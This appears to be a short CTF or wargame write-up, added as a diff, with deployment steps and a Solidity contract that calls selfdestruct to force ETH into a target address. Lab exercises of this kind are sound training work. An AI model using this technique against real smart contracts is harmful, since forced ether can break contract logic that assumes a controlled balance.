@@ -1,0 +1,13 @@
+1. Deploy contract on Remix 
+2. add some code to the original script:
+pragma solidity ^0.8.25;
+
+contract ForceEther {
+    // Self-destruct and force ETH into the target address
+    function force(address payable target) external payable {
+        require(msg.value > 0, "Must send some ETH");
+        selfdestruct(target);
+    }
+}
+3. redeploy and give the address to the force function
+
